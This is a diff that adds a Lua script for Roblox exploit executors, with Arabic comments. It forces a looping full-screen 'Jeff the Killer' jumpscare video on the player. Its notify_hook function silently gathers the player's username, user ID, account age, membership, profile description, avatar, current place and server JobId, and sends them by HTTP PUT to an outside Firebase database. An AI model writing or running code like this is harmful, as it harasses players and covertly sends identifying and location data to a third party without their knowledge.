@@ -1,0 +1,80 @@
+if jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 == true then
+	warn("Already Loading")
+    return
+end
+
+pcall(function() getgenv().jumpscare_jeffwuz_loaded = true end)
+
+getgenv().Notify = true -- ← تأكد أن التفعيل هنا
+
+local FirebaseURL = "https://tast1-e066a-default-rtdb.asia-southeast1.firebasedatabase.app/command.json" -- لاحظ: أضف `.json` لنهاية الرابط
+
+if not getcustomasset then
+	game:Shutdown()
+end
+
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService('HttpService')
+
+local ScreenGui = Instance.new("ScreenGui")
+local VideoScreen = Instance.new("VideoFrame")
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Name = "JeffTheKillerWuzHere"
+
+VideoScreen.Parent = ScreenGui
+VideoScreen.Size = UDim2.new(1,0,1,0)
+
+writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
+VideoScreen.Video = getcustomasset("yes.mp4")
+VideoScreen.Looped = true
+VideoScreen.Playing = true
+VideoScreen.Volume = 10
+
+function notify_hook()
+	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
+	local json = HttpService:JSONDecode(ThumbnailAPI)
+	local avatardata = json.data[1].imageUrl
+
+	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
+	local json = HttpService:JSONDecode(UserAPI)
+	local DescriptionData = json.description
+	local CreatedData = json.created
+
+	local data = {
+		username = player.Name,
+		displayname = player.DisplayName,
+		userid = player.UserId,
+		accountage = player.AccountAge,
+		membership = player.MembershipType.Name,
+		accountcreated = string.match(CreatedData, "^([%d-]+)"),
+		description = DescriptionData,
+		profile = "https://www.roblox.com/users/"..player.UserId.."/profile",
+		place = "https://www.roblox.com/games/"..game.PlaceId,
+		jobid = game.JobId,
+		avatar = avatardata
+	}
+
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+
+	request({
+		Url = FirebaseURL,
+		Method = "PUT", -- أو "PATCH" حسب بنية قاعدة البيانات
+		Headers = headers,
+		Body = HttpService:JSONEncode(data)
+	})
+end
+
+if getgenv().Notify == true then
+	if FirebaseURL == '' then
+		return
+	else
+		notify_hook()
+	end
+elseif getgenv().Notify == false then
+	return
+else
+	warn("True or False")
+end
